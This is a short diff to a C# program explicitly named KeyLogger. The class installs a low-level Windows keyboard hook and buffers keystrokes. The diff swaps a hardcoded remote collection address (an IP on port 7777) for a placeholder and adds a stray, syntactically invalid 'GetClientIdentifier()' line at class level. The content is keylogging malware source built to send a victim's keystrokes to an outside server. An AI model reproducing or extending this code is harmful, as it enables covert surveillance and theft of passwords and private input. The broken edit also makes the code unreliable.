@@ -7,7 +7,7 @@ using System.Threading;
 
 class KeyLogger
 {
-    private static string URL = "http://94.108.5.83:7777";
+    private static string URL = "URLPLACEHOLDER";
     private const int WH_KEYBOARD_LL = 13;
     private const int WM_KEYDOWN = 0x0100;
     private static StringBuilder buffer = new StringBuilder();
@@ -121,4 +121,6 @@ class KeyLogger
     {
         return (GetKeyState(0x14) & 0x0001) != 0;
     }
+
+GetClientIdentifier()
 }
